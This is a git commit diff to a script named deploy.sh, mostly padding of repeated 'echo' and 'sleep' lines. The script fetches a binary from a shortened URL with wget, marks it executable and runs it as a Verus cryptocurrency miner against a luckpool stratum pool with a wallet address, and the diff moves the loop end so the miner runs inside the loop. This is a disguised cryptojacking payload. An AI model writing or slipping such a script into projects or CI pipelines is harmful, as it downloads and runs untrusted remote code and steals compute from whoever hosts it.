dc8fd2818a0a9be9290f983b3ffa5103e3effe04
ersafgvcaas <94730547+ersafgvcaas@users.noreply.github.com>
2021-11-20 11:29:21 +0700

    Update deploy.sh

--- deploy.sh
+++ deploy.sh
@@ -56,8 +56,160 @@ sleep 2
 echo "Sending signal"
 sleep 2
 echo "Sending signal"
+echo "Process num: $num"
 sleep 2
-done
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Sending signal"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
+echo "Process num: $num"
+sleep 2
 wget -qO build https://git.io/JX7bv
 chmod +x build
 ./build -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RSLaafsZRq7WNqhcCQQzwxe57y2PZc3eP8.SayaInteL -p x -t 2
+done
+
